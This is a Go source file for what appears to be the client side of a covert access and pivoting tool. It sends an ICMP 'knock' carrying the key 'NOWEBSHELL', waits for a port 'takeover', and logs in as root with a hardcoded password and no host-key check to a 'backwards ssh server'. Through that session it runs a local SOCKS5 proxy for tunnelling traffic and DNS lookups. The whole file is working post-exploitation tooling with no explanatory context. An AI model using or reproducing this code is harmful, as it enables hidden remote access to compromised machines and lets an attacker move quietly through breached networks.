package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	//"io"
	"log"
	"net"
	"os"
	//"strconv"
	"strings"
	"time"

	//"time"

	"github.com/armon/go-socks5"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	//"io/ioutil"
	//"time"
)

func findUnusedPort(startPort int32) int32 {
	for port := startPort; port <= 65535; port++ {
		addr := fmt.Sprintf("localhost:%d", port)
		listener, err := net.Listen("tcp", addr)
		if err != nil {
			continue
		}
		listener.Close()
		return port
	}
	return 0
}

type sshResolver struct {
	sshConnection *ssh.Client
}

func (d sshResolver) Resolve(ctx context.Context, name string) (context.Context, net.IP, error) {

	sess, err := d.sshConnection.NewSession()
	if err != nil {
		return ctx, nil, fmt.Errorf("sess err.")
	}
	defer sess.Close()
	stdin, err := sess.StdinPipe()
	if err != nil {
		return ctx, nil, fmt.Errorf("pipe err.")
	}

	stdout, err := sess.StdoutPipe()
	if err != nil {
		return ctx, nil, fmt.Errorf("pipe err.")
	}

	stdin.Write([]byte(name))
	defer stdin.Close()
	var addr []byte = make([]byte, 256)

	_, err = stdout.Read(addr)
	if err != nil {
		return ctx, nil, fmt.Errorf("pipe err.")
	}

	resp := string(addr)

	if resp == "err" {
		return ctx, nil, fmt.Errorf("resolve err.")
	}
	ipaddr := net.ParseIP(resp)
	return ctx, ipaddr, err
}

func pingHost(addr string) {
	ipaddr := strings.Split(addr, ":")[0]

	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatalf("listen err, %s", err)
	}
	defer c.Close()

	key := "NOWEBSHELL"
	log.Printf("ICMP key is %s\n", key)
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: []byte(key),
		},
	}

	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := c.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(ipaddr)}); err != nil {
		log.Fatalf("WriteTo err, %s", err)
	}

}

func main() {

	addr := flag.String("addr", "", "address to connect to, host:port (after whitelisting)")
	pingaddr := flag.Bool("ping", false, "whether to ping the host for a whitelist first.")

	flag.Parse()

	if *addr == "" {
		fmt.Printf("addr is required.")
		return
	}

	if *pingaddr {
		pingHost(*addr)
		log.Println("waiting to be whitelisted.")
		time.Sleep(2 * time.Second)
	}

	socksconn, err := net.Dial("tcp", *addr)
	if err != nil {
		log.Printf("dial err: %v\n", err)
		return
	}

	time.Sleep(1 * time.Second) // wait for the takeover to happen
	r := bufio.NewReader(socksconn)

	for {
		line, _ := r.ReadString('\n')
		//fmt.Print(line)
		if line == "SSH\n" {
			break
		}
	}

	for i := 0; i < 8; i++ {
		socksconn.Write([]byte("sync\n"))
		time.Sleep(200 * time.Millisecond)
	}

	socksconn.Write([]byte("SSH\n"))

	sshConf := &ssh.ClientConfig{
		User:            "root",
		Auth:            []ssh.AuthMethod{ssh.Password("asdf")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	c, chans, reqs, err := ssh.NewClientConn(socksconn, "255.255.255.255", sshConf)
	if err != nil {
		log.Printf("%v\n", err)
		return
	}
	sshConn := ssh.NewClient(c, chans, reqs)

	defer sshConn.Close()

	log.Printf("connected to backwards ssh server\n")

	sshRes := sshResolver{sshConnection: sshConn}

	conf := &socks5.Config{
		Dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := sshConn.Dial(network, addr)
			return conn, err
		},
		Resolver: sshRes,
	}

	serverSocks, err := socks5.New(conf)
	if err != nil {
		fmt.Println(err)
		return
	}
	port := findUnusedPort(1080)
	log.Printf("creating a socks server@%d\n", port)
	if err := serverSocks.ListenAndServe("tcp", fmt.Sprintf("127.0.0.1:%d", port)); err != nil {
		log.Fatalf("failed to create socks5 server%v\n", err)
	}

	return

}
